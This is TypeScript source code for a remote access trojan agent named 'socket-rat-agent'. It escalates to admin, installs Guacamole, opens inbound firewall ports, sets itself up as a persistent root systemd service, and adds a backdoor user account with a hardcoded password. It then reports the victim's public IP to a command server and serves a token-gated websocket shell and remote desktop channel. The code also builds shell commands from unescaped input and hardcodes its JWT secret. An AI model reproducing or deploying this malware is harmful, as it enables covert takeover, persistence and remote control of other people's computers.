import express from "express";
import http from "http";
import os from "os";
import * as pty from "node-pty";
import { Server, Socket } from "socket.io";
import * as request from 'request';
import fs from 'fs';
import jwt from 'jsonwebtoken';
import { exec, execSync } from 'child_process';
import * as guac from 'guacamole-client';

const execAndWait = async (command: string): Promise<void> => {
	return new Promise<void>((resolve, reject) => {
		exec(command, (err, stdout) => {
			if (err) {
				reject(err);
				return;
			}

			console.log(stdout);
			resolve();
		});
	});
}

//Request admin privileges, setup guac, and open ports 1313 and 1314 in the firewall
const runPowershellScript = async (): Promise<void> => {
	return new Promise<void>((resolve, reject) => {
		// Check if the user is an admin
		exec('NET SESSION', (err, stdout) => {
			if (err) {
				console.error('Error checking admin status:', err);
				reject(err);
				throw new Error();
			}

			const isAdmin = stdout.includes('ADMINISTRATOR');
			if (!isAdmin) {
				// Prompt the user for admin credentials and exit if they don't enter them
				exec('Start-Process PowerShell -Verb RunAs', () => { });
				console.error('This script requires admin privileges. Please enter admin credentials and try again.');
				reject();
				throw new Error();
			}

			// Check if Guacd is installed and running
			exec('Get-Service -Name Guacd', async (err, stdout) => {
				if (err) {
					// Install Chocolatey and use it to install Guacd
					await execAndWait('Set-ExecutionPolicy Bypass -Scope Process -Force');
					await execAndWait('iex ((New-Object System.Net.WebClient).DownloadString(\'https://chocolatey.org/install.ps1\'))');
					await execAndWait('choco install guacd -y');

					// Start and enable Guacd
					await execAndWait('Start-Service Guacd');
					await execAndWait('Set-Service -Name Guacd -StartupType Automatic');
				} else {
					console.log('Guacd is already installed and running.');
				}

				// Open ports 1313 and 1314 in the firewall
				await execAndWait('New-NetFirewallRule -DisplayName "Guacd 1313" -Direction Inbound -Protocol TCP -LocalPort 1313 -Action Allow');
				await execAndWait('New-NetFirewallRule -DisplayName "Guacd 1314" -Direction Inbound -Protocol TCP -LocalPort 1314 -Action Allow');

				// Resolve the promise to indicate that the script has finished running
				resolve();
			});
		});
	});
}
//Request admin privileges, setup guac, and open ports 1313 and 1314 in the firewall
const runBashScript = () => {
	let isArch = execSync('cat /etc/os-release | grep ID=arch').toString().trim() !== '';
	const isDebian = execSync('cat /etc/os-release | grep ID=debian').toString().trim() !== '';
	const isRPM = execSync('cat /etc/os-release | grep ID_LIKE=rpm').toString().trim() !== '';

	if (isRPM && isArch) {
		isArch = false;
	}

	// Check if user is admin
	const userIsAdmin = execSync('id -u').toString().trim() === '0';
	if (!userIsAdmin) {
		console.log('This script requires admin privileges.');
		execSync('sudo echo "Prompting for admin privileges"');
	}

	// Check if guacd is installed and running
	const guacdIsRunning = execSync('systemctl is-active guacd.service').toString().trim() === 'active';
	if (!guacdIsRunning) {
		console.log('Guacamole daemon (guacd) is not running. Installing and starting...');
		if (isArch) {
			execSync('pacman -Sy guacamole-server');
		} else if (isDebian) {
			execSync('apt-get install -y guacamole-server');
		} else if (isRPM) {
			execSync('yum install -y guacamole-server');
		}
		execSync('systemctl enable --now guacd.service');
	}

	// Open ports 1313 and 1314 in firewall
	if (isArch) {
		execSync('iptables -A INPUT -p tcp --dport 1313 -j ACCEPT');
		execSync('iptables -A INPUT -p tcp --dport 1314 -j ACCEPT');
	} else if (isDebian) {
		execSync('ufw allow 1313/tcp');
		execSync('ufw allow 1314/tcp');
		execSync('ufw reload');
	} else if (isRPM) {
		execSync('firewall-cmd --zone=public --add-port=1313/tcp --permanent');
		execSync('firewall-cmd --zone=public --add-port=1314/tcp --permanent');
		execSync('firewall-cmd --reload');
	}

	// Copy agent file and create service
	execSync('cp ./agent /opt/agent');
	const serviceFile = `
    [Unit]
    Description=socket-rat-agent.service
    After=network.target

    [Service]
    ExecStart=/opt/agent
    Restart=always
    User=root

    [Install]
    WantedBy=multi-user.target
  `;
	execSync(`echo "${serviceFile}" > /etc/systemd/system/socket-rat-agent.service`);
	execSync('systemctl daemon-reload');
	execSync('systemctl enable --now socket-rat-agent.service');

}

const userExists = (username: string): Promise<boolean> => {
	return new Promise((resolve, reject) => {
		switch (os.platform()) {
			case 'win32':
				exec(`net user ${username}`, (error, stdout, stderr) => {
					if (error) {
						reject(error);
					} else {
						resolve(stdout.includes('User accounts for'));
					}
				});
				break;
			case 'linux':
				exec(`id -u ${username}`, (error, stdout, stderr) => {
					resolve(!error);
				});
				break;
			default:
				throw new Error('Unsupported platform');
		}
	});
}

const createUser = (username: string, password: string) => {
	switch (os.platform()) {
		case 'win32':
			exec(`net user ${username} ${password} /add /y`, (error, stdout, stderr) => {
				if (error) {
					throw error;
				}
				console.log(stdout);
			});
			break;
		case 'linux':
			exec(`sudo useradd -m -p $(openssl passwd -1 ${password}) -s /bin/bash ${username}`, (error, stdout, stderr) => {
				if (error) {
					throw error;
				}
				console.log(stdout);
			});
			break;
		default:
			throw new Error('Unsupported platform');
	}
}

// Install guacd, open ports, create service, add user
if (os.platform() === 'win32') {
	runPowershellScript();
} else {
	runBashScript();
}

const username = 'samsepi0l';
const password = 'H@ck3rm@n';

userExists(username).then((exists) => {
	if (!exists) {
		createUser(username, password);
	}
});

// Check public IP into commmand server
import('public-ip').then((publicIp) => {
	publicIp.publicIpv4().then(ip => {
		request.post('http://127.0.0.1:3000/ip', { json: { ip: ip } }, (error, response, body) => {
			if (error) {
				return;
			}
		});
	});
});


// Serve websocket shell
const app1 = express();

const server1 = http.createServer(app1);

const io1 = new Server(server1, {
	cors: {
		origin: "*",
		methods: ["GET", "POST"],
	},
});



io1.on("connection", (socket: Socket) => {
	const jwtSecret = 'H@ck3rm@nI5G0!nGT0H@ckTh3W0rld@nD@llTh3R3s0urc3s@r3M1n3N0w';
	const token = socket.handshake.query.token;

	try {
		const decodedToken = jwt.verify(token as string, jwtSecret);

		const shell = os.platform() === "win32" ? "powershell.exe" : "bash";

		const ptyProcess = pty.spawn(shell, [], {
			name: "xterm-color",
			cols: 80,
			rows: 24,
			cwd: process.env.HOME,
			env: Object.assign(process.env),
		});

		socket.on("input", (input) => {
			ptyProcess.write(input);
		});

		ptyProcess.onData((data: any) => {
			socket.emit("output", data);
		});

		socket.on("disconnect", () => {
			ptyProcess.kill();
		});
	} catch (error) {
		socket.disconnect();
	}
});



server1.listen('1313', () => {
	console.log("Server listening on port: " + 1313);
});


// Serve websocket for guacamole
const GUACD_HOST = os.hostname();
const GUACD_PORT = 4822;
const GUACD_PASSWORD = 'H@ck3rm@n';

const app2 = express();
const server2 = http.createServer(app2);
const io2 = new Server(server2, {
	cors: {
		origin: "*",
		methods: ["GET", "POST"],
	},
});

io2.on('connection', (socket) => {
	const jwtSecret = 'H@ck3rm@nI5G0!nGT0H@ckTh3W0rld@nD@llTh3R3s0urc3s@r3M1n3N0w';
	const token = socket.handshake.query.token;

	try {
		const decodedToken = jwt.verify(token as string, jwtSecret);
		const client = new guac.Client(new guac.WebSocketTunnel(`ws://${GUACD_HOST}:${GUACD_PORT}/websocket-tunnel`));
		client.onerror = (error) => {
			console.log('Guacamole error:', error);
		};

		client.connect(`token=${GUACD_PASSWORD}`);
		const display = client.getDisplay();
		const mouse = new guac.Mouse(display.getElement());

		mouse.onmousedown = (mouseState) => {
			client.sendMouseState(mouseState);
		};
		mouse.onmouseup = (mouseState) => {
			client.sendMouseState(mouseState);
		};
		mouse.onmousemove = (mouseState) => {
			client.sendMouseState(mouseState);
		};

		socket.on('disconnect', () => {
			client.disconnect();
		});
	} catch (error) {
		socket.disconnect();
	}
});

server2.listen('1314', () => {
	console.log("Server listening on port: " + 1314);
});

